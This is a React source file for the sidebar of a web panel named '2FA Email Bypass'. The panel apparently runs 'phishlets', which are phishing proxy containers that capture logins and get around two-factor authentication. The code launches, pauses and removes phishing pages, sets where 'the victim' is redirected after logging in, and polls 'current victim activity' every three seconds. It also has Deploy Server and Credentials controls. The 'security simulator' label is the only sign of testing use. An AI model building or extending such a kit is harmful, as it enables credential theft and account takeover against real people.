import { useState, useEffect, useRef } from "react";
import { createPortal } from "react-dom";
import axios from "axios";
import { useAuth } from "../context/AuthContext";
import { phishletUrl } from "../hooks/phishletUrl";

const BASE = import.meta.env.VITE_API_URL || "";

function authHeaders() {
  const token = localStorage.getItem("btb_token");
  return token ? { Authorization: `Bearer ${token}` } : {};
}

const ITEMS = [
  { label: "Deploy Server", endpoint: "/api/deploy", icon: "🖥" },
  { label: "Configure", endpoint: "/api/configure", icon: "⚙" },
  { label: "Credentials", endpoint: "/api/credentials", icon: "🔑" },
  { label: "View Logs", endpoint: "/api/logs", icon: "📋" },
];

function PhishletSettingsModal({ phishlet, onClose, onRun }) {
  const [redirectUrl, setRedirectUrl] = useState("");
  const [visits, setVisits] = useState([]);
  const [saving, setSaving] = useState(false);
  const [saveStatus, setSaveStatus] = useState("");
  const [restarting, setRestarting] = useState(false);
  const pollRef = useRef(null);

  useEffect(() => {
    axios
      .get(
        `${BASE}/api/phishlets/redirect-url?key=${encodeURIComponent(phishlet.key)}`,
      )
      .then((res) => setRedirectUrl(res.data.url || ""))
      .catch(() => setRedirectUrl(""));
  }, [phishlet.key]);

  useEffect(() => {
    function fetchVisits() {
      axios
        .get(`${BASE}/api/phishlets/visits`, {
          params: { key: phishlet.key, limit: 20 },
          headers: authHeaders(),
        })
        .then((res) => setVisits(res.data.visits || []))
        .catch(() => {});
    }
    fetchVisits();
    pollRef.current = setInterval(fetchVisits, 3000);
    return () => clearInterval(pollRef.current);
  }, [phishlet.key]);

  function handleSave() {
    setSaving(true);
    setSaveStatus("");
    axios
      .put(
        `${BASE}/api/phishlets/${phishlet.key}/redirect-url`,
        { url: redirectUrl },
        { headers: authHeaders() },
      )
      .then(() => {
        setSaveStatus("Saved");
        setTimeout(() => setSaveStatus(""), 2000);
      })
      .catch((err) => setSaveStatus(err.response?.data?.detail || err.message))
      .finally(() => setSaving(false));
  }

  function handleRestart() {
    setRestarting(true);
    axios
      .post(
        `${BASE}/api/phishlets/${phishlet.key}/restart`,
        {},
        { headers: authHeaders() },
      )
      .then((res) => {
        onRun(`Restart ${phishlet.label}`, "/api/phishlets/launch", {
          key: phishlet.key,
        });
        setSaveStatus(res.data?.message || "Restarted");
        setTimeout(() => setSaveStatus(""), 2000);
      })
      .catch((err) => setSaveStatus(err.response?.data?.detail || err.message))
      .finally(() => setRestarting(false));
  }

  return (
    <div
      className="fixed inset-0 z-50 bg-black/70 flex items-center justify-center p-4"
      onClick={onClose}
    >
      <div
        className="bg-gray-900 border border-gray-700 rounded-lg w-full max-w-lg sm:max-w-2xl max-h-[90vh] flex flex-col"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="flex items-center justify-between px-4 sm:px-5 py-3 border-b border-gray-800">
          <h2 className="text-xs sm:text-sm font-bold text-yellow-300 tracking-wide">
            {phishlet.label} Phishlet Settings
          </h2>
          <button
            onClick={onClose}
            className="text-gray-500 hover:text-red-400 text-lg leading-none"
          >
            ×
          </button>
        </div>

        <div className="px-4 sm:px-5 py-4 space-y-4 overflow-y-auto">
          <div>
            <label className="block text-xs text-gray-400 mb-1">
              Redirect URL (where the victim is sent after successful login)
            </label>
            <div className="flex gap-2">
              <input
                type="text"
                value={redirectUrl}
                onChange={(e) => setRedirectUrl(e.target.value)}
                placeholder="https://example.com"
                className="flex-1 bg-gray-800 border border-gray-700 rounded px-3 py-2 text-xs text-gray-200 focus:outline-none focus:border-green-500"
              />
              <button
                onClick={handleSave}
                disabled={saving}
                className="px-4 py-2 text-xs rounded bg-green-700 text-green-200 hover:bg-green-600 transition disabled:opacity-40"
              >
                {saving ? "Saving..." : "Save"}
              </button>
            </div>
            {saveStatus && (
              <p
                className={`mt-1 text-[10px] ${
                  saveStatus === "Saved" ? "text-green-400" : "text-red-400"
                }`}
              >
                {saveStatus}
              </p>
            )}
            <p className="mt-1 text-[10px] text-gray-600">
              Leave empty to disable the post-login redirect.
            </p>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={handleRestart}
              disabled={restarting}
              className="px-4 py-2 text-xs rounded bg-blue-700 text-blue-200 hover:bg-blue-600 transition disabled:opacity-40"
            >
              {restarting
                ? "Restarting..."
                : `Restart ${phishlet.label} Container`}
            </button>
            <span className="text-[10px] text-gray-500">
              (picks up the new addon in already-running containers)
            </span>
          </div>

          <div>
            <div className="flex items-center justify-between mb-2">
              <h3 className="text-xs font-semibold text-gray-300">
                Current victim activity
              </h3>
              <span className="text-[10px] text-gray-500">
                auto-refreshes every 3s
              </span>
            </div>
            <div className="border border-gray-800 rounded bg-gray-950 max-h-64 overflow-y-auto">
              {visits.length === 0 ? (
                <p className="px-3 py-4 text-xs text-gray-500 text-center">
                  no activity yet
                </p>
              ) : (
                <table className="w-full text-xs">
                  <thead className="sticky top-0 bg-gray-900 border-b border-gray-800">
                    <tr className="text-left text-gray-500">
                      <th className="px-3 py-1.5 font-normal w-28 sm:w-40">
                        Time
                      </th>
                      <th className="px-3 py-1.5 font-normal">URL</th>
                    </tr>
                  </thead>
                  <tbody>
                    {visits.map((v, i) => (
                      <tr
                        key={i}
                        className="border-b border-gray-800 last:border-0 hover:bg-gray-900"
                      >
                        <td className="px-3 py-1.5 text-gray-500 whitespace-nowrap text-[11px]">
                          {v.timestamp
                            ? new Date(v.timestamp).toLocaleTimeString()
                            : "-"}
                        </td>
                        <td className="px-3 py-1.5 text-gray-300 break-all text-[11px]">
                          {v.current_url}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default function Sidebar({
  onRun,
  loading,
  onOpenBrowser,
  onContainerRemovedByKey,
  onPauseToggle,
  onClose,
}) {
  const { user, logout } = useAuth();
  const [showPhishlets, setShowPhishlets] = useState(false);
  const [phishlets, setPhishlets] = useState([]);
  const [phishletFetching, setPhishletFetching] = useState(false);
  const [phishletError, setPhishletError] = useState("");
  const [settingsPhishlet, setSettingsPhishlet] = useState(null);
  const [pausingPhishlet, setPausingPhishlet] = useState(null);
  const [pauseUrl, setPauseUrl] = useState("");
  const [pausing, setPausing] = useState(false);
  const phishletRef = useRef(null);

  useEffect(() => {
    if (!showPhishlets) return;
    setPhishletFetching(true);
    setPhishletError("");
    axios
      .get(`${BASE}/api/phishlets`, { headers: authHeaders() })
      .then((res) => {
        setPhishlets(res.data.phishlets || []);
        if (res.data.error) setPhishletError(res.data.error);
      })
      .catch((err) => {
        setPhishlets([]);
        setPhishletError(err.message);
      })
      .finally(() => setPhishletFetching(false));
  }, [showPhishlets]);

  useEffect(() => {
    function handleClick(e) {
      if (phishletRef.current && !phishletRef.current.contains(e.target)) {
        setShowPhishlets(false);
      }
    }
    document.addEventListener("mousedown", handleClick);
    return () => document.removeEventListener("mousedown", handleClick);
  }, []);

  const handlePhishletLaunch = (key, label, port) => {
    setShowPhishlets(false);
    const p = onRun(`Launch ${label}`, `/api/phishlets/launch`, { key });
    if (p) {
      p.then((data) => {
        if (data && data.status === "success") {
          setTimeout(() => {
              onOpenBrowser(
              phishletUrl(key, port),
              label,
              key,
            );
          }, 4000);
        }
      });
    }
  };

  const handlePhishletOpen = (url, label, key) => {
    setShowPhishlets(false);
    onOpenBrowser(url, label, key);
  };

  const handlePhishletRemove = (name, label, port, key) => {
    setShowPhishlets(false);
    onRun(`Remove ${label}`, `/api/containers/remove`, { name }).then(() => {
      onContainerRemovedByKey(key);
      axios
        .post(
          `${BASE}/api/phishlets/${key}/unpause`,
          {},
          { headers: authHeaders() },
        )
        .catch(() => {});
    });
  };

  const handlePhishletPause = (key, label) => {
    setPausingPhishlet({ key, label });
    setPauseUrl("");
  };

  const confirmPause = () => {
    if (!pausingPhishlet || !pauseUrl.trim()) return;
    setPausing(true);
    axios
      .post(
        `${BASE}/api/phishlets/${pausingPhishlet.key}/pause`,
        { redirect_url: pauseUrl.trim() },
        { headers: authHeaders() },
      )
      .then(() => {
        onPauseToggle(pausingPhishlet.key, pauseUrl.trim());
        setPausingPhishlet(null);
        setPauseUrl("");
        setShowPhishlets(true);
      })
      .catch((err) => {
        alert(err.response?.data?.detail || err.message);
      })
      .finally(() => setPausing(false));
  };

  const handlePhishletUnpause = (key, label, port) => {
    setShowPhishlets(false);
    axios
      .post(
        `${BASE}/api/phishlets/${key}/unpause`,
        {},
        { headers: authHeaders() },
      )
      .then(() => {
        const originalUrl = phishletUrl(key, port);
        onPauseToggle(key, originalUrl);
        setShowPhishlets(true);
      })
      .catch((err) => {
        alert(err.response?.data?.detail || err.message);
      });
  };

  const handlePhishletToggleKiosk = (key, label) => {
    setShowPhishlets(false);
    onRun(
      `Toggle Kiosk ${label}`,
      `/api/phishlets/${key}/toggle-kiosk`,
      {},
    ).then(() => {
      setPhishletFetching(true);
      axios
        .get(`${BASE}/api/phishlets`, { headers: authHeaders() })
        .then((res) => setPhishlets(res.data.phishlets || []))
        .catch(() => {})
        .finally(() => setPhishletFetching(false));
    });
  };

  const handleRebuildImage = () => {
    onRun("Rebuild Firefox Image", "/api/phishlets/rebuild-image", {});
  };

  return (
    <aside className="w-56 bg-gray-900 border-r border-gray-800 flex flex-col shrink-0 h-full">
      <div className="px-4 py-5 border-b border-gray-800 flex items-center justify-between">
        <div>
          <h1 className="text-lg font-bold text-green-400 tracking-widest drop-shadow-[0_0_6px_rgba(34,197,94,0.4)]">
            {import.meta.env.VITE_APP_NAME || "2FA Email Bypass"}
          </h1>
          <p className="text-[10px] text-gray-600 mt-0.5">
            v1.0 — security simulator
          </p>
        </div>
        {onClose && (
          <button
            onClick={onClose}
            className="lg:hidden text-gray-500 hover:text-green-400 transition p-1"
          >
            <svg
              className="w-5 h-5"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M6 18L18 6M6 6l12 12"
              />
            </svg>
          </button>
        )}
      </div>

      <nav className="flex-1 p-3 space-y-1 overflow-y-auto">
        {ITEMS.map((item) => (
          <button
            key={item.label}
            onClick={() => onRun(item.label, item.endpoint)}
            disabled={loading[item.label]}
            className="w-full flex items-center gap-3 px-3 py-2.5 rounded text-sm text-gray-400 hover:text-green-300 hover:bg-gray-800 transition disabled:opacity-40 disabled:cursor-not-allowed"
          >
            <span className="text-xs">{item.icon}</span>
            <span>{loading[item.label] ? `${item.label}...` : item.label}</span>
          </button>
        ))}

        <div ref={phishletRef} className="relative">
          <button
            onClick={() => setShowPhishlets((v) => !v)}
            className="w-full flex items-center gap-3 px-3 py-2.5 rounded text-sm text-gray-400 hover:text-yellow-300 hover:bg-gray-800 transition"
          >
            <span className="text-xs">🎯</span>
            <span>Phishlets</span>
          </button>

          {showPhishlets && (
            <div className="absolute left-0 right-0 top-full mt-1 bg-gray-800 border border-gray-700 rounded-lg shadow-lg z-10 max-h-72 overflow-y-auto">
              {phishletFetching ? (
                <p className="px-3 py-2 text-xs text-gray-500">loading...</p>
              ) : phishletError ? (
                <p className="px-3 py-2 text-xs text-red-400">
                  {phishletError}
                </p>
              ) : phishlets.length === 0 ? (
                <p className="px-3 py-2 text-xs text-gray-500">
                  no phishlets configured
                </p>
              ) : (
                phishlets.map((p) => (
                  <div
                    key={p.key}
                    className="px-3 py-2 border-b border-gray-700 last:border-0"
                  >
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-xs font-medium text-gray-200">
                        {p.running ? (p.paused ? "⏸" : "🟢") : "🔴"} {p.label}
                        {p.paused && (
                          <span className="text-yellow-400 ml-1 text-[10px]">
                            paused
                          </span>
                        )}
                      </span>
                    </div>
                    <div className="flex items-center gap-1.5 flex-wrap">
                      {!p.running ? (
                        <button
                          onClick={() =>
                            handlePhishletLaunch(p.key, p.label, p.port)
                          }
                          className="text-[10px] px-2 py-0.5 rounded bg-green-700 text-green-200 hover:bg-green-600 transition"
                        >
                          Launch
                        </button>
                      ) : (
                        <>
                          <button
                            onClick={() =>
                              handlePhishletOpen(
                                phishletUrl(p.key, p.port),
                                p.label,
                                p.key,
                              )
                            }
                            className="text-[10px] px-2 py-0.5 rounded bg-blue-700 text-blue-200 hover:bg-blue-600 transition"
                          >
                            Open
                          </button>
                          {p.paused ? (
                            <button
                              onClick={() =>
                                handlePhishletUnpause(p.key, p.label, p.port)
                              }
                              className="text-[10px] px-2 py-0.5 rounded bg-yellow-700 text-yellow-200 hover:bg-yellow-600 transition"
                            >
                              Unpause
                            </button>
                          ) : (
                            <button
                              onClick={() =>
                                handlePhishletPause(p.key, p.label)
                              }
                              className="text-[10px] px-2 py-0.5 rounded bg-amber-700 text-amber-200 hover:bg-amber-600 transition"
                            >
                              Pause
                            </button>
                          )}
                          <button
                            onClick={() =>
                              handlePhishletRemove(
                                p.name,
                                p.label,
                                p.port,
                                p.key,
                              )
                            }
                            className="text-[10px] px-2 py-0.5 rounded bg-red-800 text-red-200 hover:bg-red-700 transition"
                          >
                            Remove
                          </button>
                          <button
                            onClick={() =>
                              handlePhishletToggleKiosk(p.key, p.label)
                            }
                            title={
                              p.kiosk
                                ? "Kiosk ON — click to show toolbar + extension icons"
                                : "Kiosk OFF — click to go fullscreen"
                            }
                            className={`text-[10px] px-2 py-0.5 rounded transition ${
                              p.kiosk
                                ? "bg-purple-700 text-purple-200 hover:bg-purple-600"
                                : "bg-gray-700 text-gray-200 hover:bg-gray-600"
                            }`}
                          >
                            {p.kiosk ? "🖥 Kiosk" : "🧩 Toolbar"}
                          </button>
                        </>
                      )}
                      <button
                        onClick={() => setSettingsPhishlet(p)}
                        title="Settings (redirect URL + live activity)"
                        className="text-[10px] px-2 py-0.5 rounded bg-gray-700 text-gray-200 hover:bg-gray-600 transition"
                      >
                        ⚙
                      </button>
                    </div>
                  </div>
                ))
              )}
            </div>
          )}
        </div>

        <button
          onClick={() =>
            onOpenBrowser(
              `http://${import.meta.env.VITE_VPS_IP || "127.0.0.1"}:5800`,
              "Firefox",
            )
          }
          className="w-full flex items-center gap-3 px-3 py-2.5 rounded text-sm text-gray-400 hover:text-green-300 hover:bg-gray-800 transition"
        >
          <span className="text-xs">🌐</span>
          <span>Open Firefox</span>
        </button>

        <button
          onClick={handleRebuildImage}
          disabled={loading["Rebuild Firefox Image"]}
          className="w-full flex items-center gap-3 px-3 py-2.5 rounded text-sm text-gray-400 hover:text-orange-300 hover:bg-gray-800 transition disabled:opacity-40 disabled:cursor-not-allowed"
        >
          <span className="text-xs">🔧</span>
          <span>
            {loading["Rebuild Firefox Image"]
              ? "Rebuilding Image..."
              : "Rebuild Image"}
          </span>
        </button>
      </nav>

      <div className="p-3 border-t border-gray-800 space-y-2">
        <p className="text-xs text-gray-600 truncate">
          {user?.name || user?.email}
        </p>
        <button
          onClick={logout}
          className="text-xs text-red-500 hover:text-red-400 transition"
        >
          logout
        </button>
      </div>

      {createPortal(
        settingsPhishlet && (
          <PhishletSettingsModal
            phishlet={settingsPhishlet}
            onClose={() => setSettingsPhishlet(null)}
            onRun={onRun}
          />
        ),
        document.body,
      )}

      {createPortal(
        pausingPhishlet && (
          <div
            className="fixed inset-0 z-50 bg-black/70 flex items-center justify-center p-4"
            onClick={() => setPausingPhishlet(null)}
          >
            <div
              className="bg-gray-900 border border-gray-700 rounded-lg w-full max-w-sm"
              onClick={(e) => e.stopPropagation()}
            >
              <div className="flex items-center justify-between px-4 py-3 border-b border-gray-800">
                <h2 className="text-sm font-bold text-amber-300">
                  Pause {pausingPhishlet.label}
                </h2>
                <button
                  onClick={() => setPausingPhishlet(null)}
                  className="text-gray-500 hover:text-red-400 text-lg leading-none"
                >
                  ×
                </button>
              </div>
              <div className="px-4 py-4 space-y-3">
                <p className="text-xs text-gray-400">
                  All visitors will be redirected to this URL instead of the
                  phishlet page.
                </p>
                <input
                  type="text"
                  value={pauseUrl}
                  onChange={(e) => setPauseUrl(e.target.value)}
                  placeholder="https://example.com"
                  className="w-full bg-gray-800 border border-gray-700 rounded px-3 py-2 text-xs text-gray-200 focus:outline-none focus:border-amber-500"
                  autoFocus
                  onKeyDown={(e) => {
                    if (e.key === "Enter") confirmPause();
                  }}
                />
                <div className="flex gap-2 justify-end">
                  <button
                    onClick={() => setPausingPhishlet(null)}
                    className="px-3 py-1.5 text-xs rounded bg-gray-700 text-gray-300 hover:bg-gray-600 transition"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={confirmPause}
                    disabled={pausing || !pauseUrl.trim()}
                    className="px-3 py-1.5 text-xs rounded bg-amber-700 text-amber-100 hover:bg-amber-600 transition disabled:opacity-40"
                  >
                    {pausing ? "Pausing..." : "Pause"}
                  </button>
                </div>
              </div>
            </div>
          </div>
        ),
        document.body,
      )}
    </aside>
  );
}
